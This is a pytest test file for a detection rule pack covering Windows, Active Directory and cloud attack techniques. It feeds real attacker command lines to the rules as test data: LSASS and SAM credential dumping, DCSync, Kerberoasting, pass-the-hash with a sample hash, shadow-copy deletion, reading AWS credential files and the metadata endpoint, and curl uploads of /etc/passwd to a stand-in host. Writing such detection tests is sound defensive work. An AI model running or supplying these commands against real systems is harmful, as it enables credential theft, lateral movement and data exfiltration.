"""The Windows, Active Directory and cloud rule pack: credential dumping, Kerberos roasting, lateral movement,
recovery inhibition, credential files, the cloud metadata service, sudo rights and HTTP exfiltration."""

import pytest

from interlinear_cti.normalize import normalize_text
from interlinear_cti.rules import load_library

PACK = {
    "dcsync": ["T1003.006"],
    "ntds-dump": ["T1003.003"],
    "sam-dump": ["T1003.002"],
    "lsass-dump": ["T1003.001"],
    "shadow-copy-delete": ["T1490"],
    "kerberoast": ["T1558.003"],
    "asreproast": ["T1558.004"],
    "evil-winrm-pth": ["T1550.002", "T1021.006"],
    "winrm-remote": ["T1021.006"],
    "netexec-pth": ["T1550.002"],
    "netexec-auth": ["T1110.003"],
    "smb-exec": ["T1021.002", "T1569.002"],
    "wmi-exec": ["T1047"],
    "ad-collection": ["T1087.002", "T1069.002"],
    "credential-files": ["T1552.001"],
    "cloud-metadata": ["T1552.005"],
    "sudo-list": ["T1548.003"],
    "http-upload": ["T1048"],
}

LINES = [
    ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full", "lsass-dump"),
    ("procdump64.exe -accepteula -ma lsass.exe l.dmp", "lsass-dump"),
    ('mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', "lsass-dump"),
    ("vssadmin delete shadows /all /quiet", "shadow-copy-delete"),
    ("wmic shadowcopy delete", "shadow-copy-delete"),
    ("bcdedit /set {default} recoveryenabled No", "shadow-copy-delete"),
    ("GetUserSPNs.py corp/jdoe -dc-ip 10.0.0.5 -request", "kerberoast"),
    ("Rubeus.exe kerberoast /outfile:h.txt", "kerberoast"),
    ("GetNPUsers.py corp/ -usersfile u.txt -no-pass", "asreproast"),
    ("secretsdump.py -just-dc corp/admin@10.0.0.5", "dcsync"),
    ('mimikatz "lsadump::dcsync /domain:corp /user:krbtgt" exit', "dcsync"),
    ("secretsdump.py -sam SAM -system SYSTEM LOCAL", "sam-dump"),
    ("reg save HKLM\\SAM C:\\Temp\\SAM", "sam-dump"),
    ('ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q', "ntds-dump"),
    ("evil-winrm -i 10.0.0.5 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c", "evil-winrm-pth"),
    ("evil-winrm -i 10.0.0.5 -u admin -p x", "winrm-remote"),
    ("Enter-PSSession -ComputerName dc01", "winrm-remote"),
    ("nxc smb 10.0.0.0/24 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c", "netexec-pth"),
    ("crackmapexec smb 10.0.0.0/24 -u users.txt -p x", "netexec-auth"),
    ("psexec.py corp/admin@10.0.0.5", "smb-exec"),
    ("PsExec64.exe \\\\dc01 -s cmd.exe", "smb-exec"),
    ("wmiexec.py corp/admin@10.0.0.5", "wmi-exec"),
    ('wmic /node:10.0.0.5 process call create "cmd.exe /c whoami"', "wmi-exec"),
    ("bloodhound-python -d corp -u jdoe -p x -c All", "ad-collection"),
    ("cat ~/.aws/credentials", "credential-files"),
    ("cat /var/www/html/.env", "credential-files"),
    ("type C:\\Users\\admin\\.aws\\credentials", "credential-files"),
    ("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", "cloud-metadata"),
    ("sudo -l", "sudo-list"),
    ("curl -T /etc/passwd http://203.0.113.5:8000/", "http-upload"),
    ("curl -F 'file=@/tmp/d.tgz' http://203.0.113.5/up", "http-upload"),
    ("Invoke-WebRequest -Uri http://203.0.113.5/u -Method POST -InFile C:\\temp\\d.zip", "http-upload"),
    ("Invoke-RestMethod -Uri http://203.0.113.5/u -Method Post -Body (Get-Content C:\\temp\\d.txt)", "http-upload"),
]

NOT_THESE = [
    "rundll32 shell32.dll,Control_RunDLL",
    "vssadmin list shadows",
    "sudo ls -l /root",
    "nano ~/.aws/credentials",
    "cat .env.example",
    "curl -s http://203.0.113.5/x -o x",
    "curl -d 'user=a' http://203.0.113.5/login",
    "wmic /node:dc01 os get caption",
    "nxc smb 10.0.0.0/24",
]


@pytest.fixture(scope="module")
def library(resolver_module):
    return load_library(resolver=resolver_module)


@pytest.fixture(scope="module")
def resolver_module():
    from conftest import FakeResolver

    return FakeResolver()


def test_every_pack_rule_exists_with_its_techniques(library):
    rules = {rule.id: rule for rule in library.rules}
    assert {rid: rules[rid].techniques for rid in PACK if rid in rules} == PACK


@pytest.mark.parametrize("text, rule_id", LINES)
def test_pack_lines_get_their_rule(library, text, rule_id):
    rule = library.match(normalize_text(text), context=False)
    assert rule is not None and rule.id == rule_id, (text, rule and rule.id)


@pytest.mark.parametrize("text", NOT_THESE)
def test_near_misses_get_no_pack_rule(library, text):
    rule = library.match(normalize_text(text), context=False)
    assert rule is None or rule.id not in PACK, (text, rule.id)
